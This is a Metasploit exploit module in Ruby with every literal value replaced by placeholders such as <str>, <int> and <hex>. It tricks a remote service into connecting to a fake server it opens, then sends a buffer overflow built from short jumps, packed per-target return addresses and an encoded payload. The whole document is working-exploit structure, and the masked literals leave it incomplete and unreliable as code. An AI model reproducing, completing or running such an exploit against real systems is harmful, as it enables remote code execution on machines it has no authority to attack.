require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = AverageRanking include Msf :: Exploit :: Remote :: Tcp def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> , ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > true , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > - <int> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > [ <hex> , <hex> , <hex> ] } ] , [ <str> , { <str> = > [ <hex> , <hex> , <hex> ] } ] , [ <str> , { <str> = > [ <hex> , <hex> , <hex> ] } ] , [ <str> , { <str> = > [ <hex> , <hex> , <hex> ] } ] , ] , <str> = > <str> ) ) register_options ( [ Opt :: RPORT ( <int> ) , OptPort . new ( <str> , [ true , <str> , <int> ] ) , ] , self . class ) end def exploit if ( connect ) sock . put ( <str> ) print_status ( <str> ) disconnect fakecaservice = Rex :: Socket :: TcpServer . create ( <str> = > <str> , <str> = > datastore [ <str> ] , <str> = > false , <str> = > { <str> = > framework , <str> = > self , } ) add_socket ( fakecaservice ) fakecaservice . start print_status ( <str> ) begin Timeout . timeout ( <int> ) do done = false while ( not done and session = fakecaservice . accept ) print_status ( <str> Rex :: Socket . source_address ( rhost ) <str> ) session . put ( <str> ) req = session . recvfrom ( <int> ) [ <int> ] next if not req next if req . empty? if ( req =~ <str> ) print_status ( <str> $1 <str> ) end buff = rand_text_alphanumeric ( <int> ) buff [ <int> , <int> ] = Rex :: Arch :: X86 . jmp_short ( <int> ) buff [ <int> , <int> ] = [ target [ <str> ] [ <int> ] ] . pack ( <str> ) buff [ <int> , <int> ] = [ target [ <str> ] [ <int> ] ] . pack ( <str> ) buff [ <int> , <int> ] = Rex :: Arch :: X86 . jmp_short ( <int> ) buff [ <int> , <int> ] = [ target [ <str> ] [ <int> ] ] . pack ( <str> ) buff [ <int> , payload . encoded . length ] = payload . encoded sploit = <str> buff <str> session . put ( sploit ) session . close end end ensure handler fakecaservice . close return end end end end 
